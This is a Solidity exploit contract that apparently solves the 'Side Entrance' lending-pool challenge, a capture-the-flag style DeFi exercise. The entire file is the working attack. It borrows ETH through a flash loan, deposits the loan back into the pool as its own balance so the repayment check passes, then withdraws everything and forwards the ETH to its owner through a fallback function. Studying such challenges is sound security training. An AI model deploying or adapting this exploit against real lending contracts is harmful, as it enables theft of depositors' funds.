// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceHack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address owner;

    constructor(address p) public {
        pool = SideEntranceLenderPool(p);
        owner = msg.sender;
    }

    // Triggered when received ETH
    fallback() external payable {
        payable(owner).transfer(address(this).balance);
    }

    // Trigger by flashloan
    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function steal(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }
}
